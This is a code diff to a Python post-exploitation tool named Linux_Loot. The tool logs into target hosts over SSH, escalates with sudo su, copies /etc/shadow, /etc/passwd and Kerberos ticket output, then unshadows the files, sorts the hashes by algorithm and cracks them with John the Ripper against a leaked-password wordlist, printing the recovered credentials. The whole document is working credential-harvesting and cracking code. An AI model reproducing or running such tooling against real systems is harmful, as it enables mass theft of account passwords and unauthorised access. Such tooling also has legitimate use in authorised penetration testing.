@@ -3,6 +3,7 @@ import argparse
 import paramiko as paramiko
 from psycopg2 import Error
 import subprocess
+from collections import OrderedDict
 
 
 class Linux_Loot:
@@ -20,16 +21,8 @@ class Linux_Loot:
 
         # privilege escalation
         parser.add_argument("-p", "--privesc", help="privesc method: ss - sudo su; <??> - ??", default='ss')
+        parser.add_argument("-b", "--brute", default=False)
         return parser.parse_args()
-
-    # Parse input file content
-    def parse_list(self):
-        params = open(self.opt.file, 'r')
-        targets = []
-        for line in params:
-            if line != '\n':
-                targets.append(line.rstrip().split(' '))
-        return targets
 
     # Establish connection with single host
     def ssh_connect(self, host, user, pas, port):
@@ -57,6 +50,20 @@ class Linux_Loot:
         stdin, stdout, stderr = con.exec_command(payload)
         return stdout.read().decode()
 
+    # Parse input file content
+    def parse_list(self):
+        params = open(self.opt.file, 'r')
+        targets = []
+        for line in params:
+            if line != '\n':
+                targets.append(line.rstrip().split(' '))
+        return targets
+
+    def parse_result_john(self, result):
+        if result.find('No password hashes loaded') == -1:
+            user_pass = result.split('\n')[1].split()
+            print(f'\n{user_pass[1][1:-1]}:{user_pass[0]}')
+
     # Select priv escalation payload (for future modifications)
     def privesc_methods(self, pas):
         if self.opt.privesc == 'ss':
@@ -71,6 +78,35 @@ class Linux_Loot:
         file = open(f'./Linux_Loot/{ip}/{name}', 'w')
         file.write(data)
         file.close()
+
+    # Writing all hashes to a separate directory and sorting (for future modifications)
+    def hashes_write(self, data):
+        os.makedirs(f'./Linux_Loot/All_hashes', exist_ok=True)
+        for h in data:
+            if h.split('$')[1] == 'y':
+                file = open(f'./Linux_Loot/All_hashes/$y$', 'a')
+                file.write(h + '\n')
+                file.close()
+            elif h.split('$')[1] == '1':
+                file = open(f'./Linux_Loot/All_hashes/$1$', 'a')
+                file.write(h + '\n')
+                file.close()
+            elif h.split('$')[1] == '5':
+                file = open(f'./Linux_Loot/All_hashes/$5$', 'a')
+                file.write(h + '\n')
+                file.close()
+            elif h.split('$')[1] == '6':
+                file = open(f'./Linux_Loot/All_hashes/$6$', 'a')
+                file.write(h + '\n')
+                file.close()
+            else:
+                file = open(f'./Linux_Loot/All_hashes/others', 'a')
+                file.write(h + '\n')
+                file.close()
+
+    # Records the compliance of the user's hash and password
+    def password_write(self, file):
+        pass
 
     # Collect loot from single host
     def collect_loot(self, target):
@@ -95,7 +131,10 @@ class Linux_Loot:
                               'tail -n +1 /etc/resolv.conf', 'klist']
             for command in loot_file_list:
                 # Write loot to the file
-                self.loot_write(target[2], command.split()[-1][1:].replace("/", "_") if command.split()[-1] != 'klist' else 'klist', self.ssh_exec(ssh, pe, command))
+                self.loot_write(target[2],
+                                command.split()[-1][1:].replace("/", "_")
+                                if command.split()[-1] != 'klist' else 'klist',
+                                self.ssh_exec(ssh, pe, command))
 
             # Close connection
             self.ssh_disconnect(ssh)
@@ -104,21 +143,32 @@ class Linux_Loot:
         except (Exception, Error) as error:
             print("[!] Operation failed: ", error)
 
+    # Getting users and their hashes
+    def unshadow(self):
+        user_hash = ''
+        for target in self.targets:
+            unsh = subprocess.run(
+                ['unshadow', f'./Linux_Loot/{target[2]}/etc_passwd', f'./Linux_Loot/{target[2]}/etc_shadow'],
+                stdout=subprocess.PIPE, text=True)
+
+            for output in unsh.stdout.replace(' ', '_').split():
+                if output.split(':')[1].find('!') == -1 and output.split(':')[1].find('*') == -1:
+                    user_hash += ':'.join(output.split(':')[0:2]) + '\n'
+        self.hashes_write(list(OrderedDict.fromkeys(user_hash.split())))
+
     # Brute force hashes
     def brute_force(self):
-        for target in self.targets:
-            # Launching john
-            os.system(f'unshadow ./Linux_Loot/{target[2]}/etc_passwd ./Linux_Loot/{target[2]}/etc_shadow | cut -d: -f1,2 > ./Linux_Loot/{target[2]}/user_hash.txt')
-            proc = subprocess.Popen(['john', '--wordlist=/usr/share/seclists/Passwords/500-worst-passwords.txt', f'./Linux_Loot/{target[2]}/user_hash.txt'], stdout=subprocess.PIPE, text=True)
-            proc.wait()
-            output, errors = (proc.communicate())
+        # Launching john (editable wordlist: '--wordlist=/usr/share/seclists/Passwords/500-worst-passwords.txt')
+        stdout = subprocess.run(['ls', './Linux_Loot/All_hashes'], stdout=subprocess.PIPE, text=True)
+        files = stdout.stdout
 
-            # Error handling
-            if errors is not None:
-                print("[!] Operation failed: ", errors)
-
-            # Write loot to the file
-            self.loot_write(target[2], 'john_brute.txt', output.rstrip())
+        for file in files.split():
+            print(f'[*] ./Linux_Loot/All_hashes/{file}')
+            john = subprocess.Popen(['john', '--wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt',
+                                     f'./Linux_Loot/All_hashes/{file}'], stdout=subprocess.PIPE, text=True)
+            john.wait()
+            stdout, stderr = john.communicate()
+            self.parse_result_john(stdout)
 
     # Try to collect loot from all given hosts
     def loot_all_hosts(self):
@@ -126,8 +176,12 @@ class Linux_Loot:
         self.targets = self.parse_list()
         for target in self.targets:
             self.collect_loot(target)
-        print('+-----------------------BRUTE------------------------+')
-        self.brute_force()
+        self.unshadow()
+
+        if self.opt.brute:
+            print('+-----------------------BRUTE------------------------+')
+            self.brute_force()
+
         print("+----------------------------------------------------+")
 
     def main(self):
